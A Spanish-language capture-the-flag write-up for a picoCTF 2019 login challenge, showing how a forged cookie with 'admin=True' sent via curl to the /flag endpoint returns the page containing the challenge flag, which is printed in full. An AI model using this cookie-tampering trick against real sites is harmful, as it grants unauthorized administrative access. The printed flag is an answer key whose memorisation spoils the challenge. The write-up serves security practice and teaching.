# Objetivo

La fábrica oculta cosas a todos sus usuarios. ¿Puedes iniciar sesión como Joe y encontrar lo que han estado mirando? https://jupiter.challenges.picoctf.org/problem/15796/ (enlace) o http://jupiter.challenges.picoctf.org:15796
1. Hmm, ¿no parece verificar la contraseña de nadie, excepto la de Joe?

## Solución

Como no podemos entrar como Joe, iniciamos sesion con otro usuario y contrasena, encontraremos este mensaje:
`Éxito: ¡Has iniciado sesión! Aunque no estoy seguro de que puedas ver la bandera.`
Entonces, al inspeccionar la pagina, nos damos cuenta que tiene una coockie en la cual manda estos datos de usuario, password y user. Abrimos una terminal y usando el comando `curl` hacemos lo siguiente:
```
┌┌┌──(jesus㉿KaliJesus)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: usermane=jesus;Password=jesus;admin=True"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>                                                                                                                                   
┌──(jesus㉿KaliJesus)-[~]
└─$ 
```
Ahí encontraremos la contraseña.
## Notas adicionales

`HTTP Headers`->Permite al cliente (navegador) y servidor enviar información adicional junto a una petición o respuesta.
`curl`->Se usa en la linea de comandos para transferir datos con URLs.
## Referencias

https://www.godaddy.com/resources/latam/stories/que-es-comando-curl-como-usarlo#:~:text=cURL%2C%20que%20significa%20'Client%20for,HTTPS%2C%20FTP%20y%20muchos%20otros.
